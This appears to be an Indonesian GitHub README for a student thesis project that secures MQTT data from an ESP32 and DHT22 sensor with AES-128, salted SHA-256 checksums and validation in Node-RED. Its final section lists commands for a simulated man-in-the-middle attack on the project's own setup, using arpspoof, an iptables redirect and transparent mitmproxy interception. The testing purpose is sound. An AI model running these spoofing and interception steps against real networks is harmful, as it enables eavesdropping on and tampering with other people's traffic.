# Project-TA-2025-Sistem-Keamanan-Transmisi-Data-pada-Sistem-IoT
Project TA ini mengenai Pembuatan Sistem Keamanan Transmisi Data pada sistem IoT yang berbasis perangkat ESP-32 dan DHT-22. Transmisi Data menggunakan broker MQTT pada port 1883 (kenapa menggunakan port Public?? karna dapat mempermudah tujuan dari Project TA ini yaitu menguji sistem keamanan yang dibuat dengan melakukan simulasi serangan MITM). Proses transmisi data pada broker MQTT menggunakan skema publish-subscribe. Publisher mengirimkan data ke broker, kemudian broker meneruskannya ke subscriber yang telah berlangganan pada topik tertentu di publisher. Sistem keamanan yang dibuat menggunakan metode Checksum SHA-256, teknik salt, dan AES-128. Metode checksum SHA-256 disini berfungsi untuk memeriksa integritas data, memastikan apakah data telah mengalami perubahan setelah checksum tersebut dibuat. Metode AES-128 digunakan untuk menjaga kerahasiaan data (data yang dimaksud adalah data temperature dan humidity yang dihasilkan dari DHT22). Penggunaan teknik salt digunakan untuk memastikan meskipun data asli memiliki nilai yang sama, maka hasil hash/checksum akan berbeda karena adanya variasi pada nilai salt yang ditambahkan sebelum proses hashing dilakukan. 
Adapun rancangan sistem keamanan yang dibuat tersebut melalui sequence diagram pada gambar berikut:
 <img width="3227" height="2802" alt="gambar-rancangan-sistem-SEQUENCE-DIAGRAM-keamanan-pada-perangkat-IoT drawio" src="https://github.com/user-attachments/assets/cddad807-cb08-41dc-a7b1-f7943751fd6c" />
Proses rancangan sistem pada gambar diatas menjelaskan, DHT22 mengukur temperature dan humidity dilingkungan sekitar dan mengirimkan data yang didapat tersebut ke ESP32. Di ESP32 kedua data tersebut akan di proses terlebih dahulu dengan AES-128 untuk dienkripsi agar mendapatkan nilai chipertext. Kemudian nilai chipertext yang didapatkan dari masing-masing kedua data tersebut digabungkan bersama nilai salt yang telah dibuat, untuk menghitung nilai checksum dengan menggunakan SHA-256. Data-data chipertext temperature, dan humidity, lalu data checksum SHA-256, dan ID yang digunakan sebagai penanda unik disetiap masing-masing data yang dikirimkan ke broker, dan diteruskan ke subscriber oleh broker. Di subscriber data akan melalui proses validasi dengan melakukan perbandingan diantara checksum yang diterima subscriber dan checksum yang dihitung ulang di subscriber dari data-data yang diterima seperti chipertext temperature, dan humidity, dan data salt. Hasil dari validasi akan memiliki dua output yaitu Data Manipulated ketika dinyatakan pada sistem keamanan subscriber bahwa terdapat perubahan salah satu nilai data yang ditandakan terdapat perbedaan nilai checksum yang dihitung ulang dengan nilai checksum yang diterima oleh subscriber. Ketika ini terjadi, proses dekripsi untuk mendapatkan nilai plain text dari data chipertext temperature, dan humidity tidak akan dilakukan dan subscriber secara langsung akan melakukan request pengiriman ulang data ke publisher untuk mendapatkan data asli yang tidak dirubah/dimanipulasi. Sebaliknya ketika validasi data dinyatakan Data Valid oleh sistem keamanan di subscriber maka proses dekripsi akan dilakukan untuk mendapatkan plain text data temperature, humidity, serta menginformasikan bahwa data valid.

# Instalasi Program Publisher dan Subscriber
1. untuk program publisher dapat menggunakan software arduino IDE, download file program_publisher_arduino_IDE dan jalankan di software arduino IDE. diperlukan konfigurasi tambahan seperti install board manager, library manager, serta menentukan port, example: COM3 .
2. untuk program Subscriber dapat menggunakan software node-red, download file flows.json dan import file tersebut pada software node-red.
 
# Tahapan proses simulasi MITM attack menggunakan tools MITM Proxy pada sistem keamanan yang dibuat
Sebelum memulai tahapan ini, perangkat manapun yang ditargetkan diharuskan telah terinstall certificate mitmproxy-ca-cert.pem .
- MITM attack memiliki beberapa teknik serangan, salah satunya yang digunakan pada simulasi serangan ini adalah ARP Spoofing melalui perintah berikut:
   1. sudo sysctl net.ipv4.ip_forward=1
   2. sudo sysctl -w net.ipv4.conf.all.send_redirects=0
   3. sudo arpspoof -i eth0 -r -t [isi-IP-Target] [isi-IP-Router]

- setelah proses ARP Spoofing berhasil dijalankan, selanjutnya dilakukan perintah berikut:
   1. sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport [isi-Port-target] -j REDIRECT --to-port 8081
   2. mitmproxy --mode transparent --showhost -p 8081 -k --tcp-hosts ".*"
- Reference related to use MITM tools: https://github.com/nmatt0/mitmtools
  
- Setelahnya akan diarahkan ke flows panel pada tools MITM Proxy, didalam flows panel tersebut akan terdapat isi komunikasi yang dilakukan oleh target. dan untuk melakukan intercept pada salah satu data komunikasi diperlukan menggunakan perintah: ~b [isi-format-topik-data-target] . 
